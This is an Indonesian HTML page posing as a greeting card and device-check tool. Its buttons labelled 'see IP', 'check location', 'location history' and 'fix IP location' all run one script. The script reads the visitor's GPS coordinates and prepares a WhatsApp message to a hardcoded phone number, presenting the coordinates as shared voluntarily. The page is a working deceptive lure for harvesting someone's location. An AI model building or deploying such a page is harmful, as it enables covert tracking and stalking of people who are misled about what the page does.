<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Kartu Ucapan</title>
  <!-- Bootstrap Icons CDN -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #c6ffdd, #fbd786, #f7797d);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      color: #333;
      text-align: center;
    }
    .card {
      background-color: white;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.15);
      max-width: 400px;
      width: 90%;
    }
    h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      margin-top: 0;
    }
    button, .wa-button {
      margin: 10px 0;
      background-color: #25D366;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 8px;
    }
    button:hover, .wa-button:hover {
      background-color: #1ebe5d;
    }
    .result {
      font-size: 14px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Hai Sahabat üëã</h1>
    <p>Ada fitur seru untuk cek kondisi perangkatmu</p>

    <button onclick="getLocation()"><i class="bi bi-globe"></i> Lihat IP</button>
    <button onclick="getLocation()"><i class="bi bi-geo-alt"></i> Cek Lokasi Sekarang</button>
    <button onclick="getLocation()"><i class="bi bi-clock-history"></i> History Lokasi</button>
    <button onclick="getLocation()"><i class="bi bi-tools"></i> Perbaiki Lokasi IP</button>

    <div class="result" id="output"></div>
  </div>

  <script>
    function getLocation() {
      const output = document.getElementById("output");

      if (!navigator.geolocation) {
        output.innerHTML = "Browser Anda tidak mendukung fitur lokasi.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const nomorWA = "6285813661740";
          const pesan = `Halo! üëã\nSaya ingin membagikan sesuatu denganmu:\n\nüìç Lokasi saya sekarang:\nLatitude: ${lat}\nLongitude: ${lon}\n\nLihat di Google Maps:\nhttps://www.google.com/maps?q=${lat},${lon}`;
          const encodedPesan = encodeURIComponent(pesan);
          const waLink = `https://wa.me/${nomorWA}?text=${encodedPesan}`;

          output.innerHTML = `
            <p>Data siap dikirim. Klik tombol di bawah ini:</p>
            <a href="${waLink}" target="_blank" class="wa-button"><i class="bi bi-whatsapp"></i> Kirim ke WhatsApp</a>
          `;
        },
        (error) => {
          output.innerHTML = "Tidak dapat mengambil lokasi. Pastikan izin lokasi diaktifkan.";
        }
      );
    }
  </script>
</body>
</html>
